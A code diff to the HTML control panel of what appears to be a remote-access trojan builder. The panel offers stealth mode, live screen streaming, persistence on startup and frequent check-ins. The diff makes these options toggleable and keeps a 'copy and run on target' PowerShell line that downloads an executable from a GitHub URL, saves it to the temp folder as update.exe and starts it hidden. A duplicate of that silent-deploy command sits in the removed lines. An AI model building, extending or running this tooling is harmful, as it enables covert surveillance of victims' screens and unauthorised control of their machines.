@@ -208,7 +208,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
         <p>Sends status updates every 200ms to keep the dashboard connection alive.</p>
       </div>
       <label class="toggle">
-        <input type="checkbox" checked disabled>
+        <input type="checkbox" checked onchange="updateBuildCmd()">
         <span class="slider"></span>
       </label>
     </div>
@@ -218,7 +218,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
         <p>Continuously streams the desktop at 5 FPS with automatic cleanup.</p>
       </div>
       <label class="toggle">
-        <input type="checkbox" checked disabled>
+        <input type="checkbox" checked onchange="updateBuildCmd()">
         <span class="slider"></span>
       </label>
     </div>
@@ -228,7 +228,7 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
         <p>Runs completely hidden with no console window or user-visible traces.</p>
       </div>
       <label class="toggle">
-        <input type="checkbox" checked disabled>
+        <input type="checkbox" checked onchange="updateBuildCmd()">
         <span class="slider"></span>
       </label>
     </div>
@@ -242,52 +242,6 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
       <span style="color:#58a6ff">#</span> <span style="color:#8b949e">Build command — copy and run on target:</span>
       <br><span id="buildCmdText">Invoke-WebRequest -Uri "https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe" -OutFile "$env:TEMP\update.exe"; Start-Process -WindowStyle Hidden "$env:TEMP\update.exe"</span>
       <button class="copy-btn" onclick="copyBuildCmd()">Copy</button>
-    </div>
-      <label class="toggle">
-        <input type="checkbox" id="startupToggle" checked disabled>
-        <span class="slider"></span>
-      </label>
-    </div>
-    <div class="option-row">
-      <div class="desc">
-        <label>Auto Ping</label>
-        <p>Sends status updates every 200ms to keep the dashboard connection alive.</p>
-      </div>
-      <label class="toggle">
-        <input type="checkbox" checked disabled>
-        <span class="slider"></span>
-      </label>
-    </div>
-    <div class="option-row">
-      <div class="desc">
-        <label>Live Screen Stream</label>
-        <p>Continuously streams the desktop at 5 FPS with automatic cleanup.</p>
-      </div>
-      <label class="toggle">
-        <input type="checkbox" checked disabled>
-        <span class="slider"></span>
-      </label>
-    </div>
-    <div class="option-row">
-      <div class="desc">
-        <label>Stealth Mode</label>
-        <p>Runs completely hidden with no console window or user-visible traces.</p>
-      </div>
-      <label class="toggle">
-        <input type="checkbox" checked disabled>
-        <span class="slider"></span>
-      </label>
-    </div>
-
-    <div class="build-actions">
-      <button class="btn btn-primary" onclick="downloadClient()">â¬‡ Download Client</button>
-      <span style="color:#8b949e;font-size:.85rem">No configuration file needed â€” just run the exe.</span>
-    </div>
-
-    <div class="install-cmd">
-      <span style="color:#58a6ff">#</span> <span style="color:#8b949e">Silent deploy via PowerShell:</span>
-      <br>Invoke-WebRequest -Uri <span style="color:#d29922">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span style="color:#3fb950">"$env:TEMP\update.exe"</span>; Start-Process -WindowStyle Hidden <span style="color:#3fb950">"$env:TEMP\update.exe"</span>
-      <button class="copy-btn" onclick="copyCmd()">Copy</button>
     </div>
   </div>
 
@@ -378,9 +332,15 @@ async function removeClient(name){
 function buildArgs(){
  const name=document.getElementById('clientName').value.trim();
  const startup=document.getElementById('startupToggle').checked;
+ const ping=document.getElementById('pingToggle').checked;
+ const screen=document.getElementById('screenToggle').checked;
+ const stealth=document.getElementById('stealthToggle').checked;
  let args='';
  if(name) args+=' --name "'+name+'"';
  if(!startup) args+=' --no-startup';
+ if(!ping) args+=' --no-ping';
+ if(!screen) args+=' --no-screen';
+ if(!stealth) args+=' --show';
  return args;
 }
 
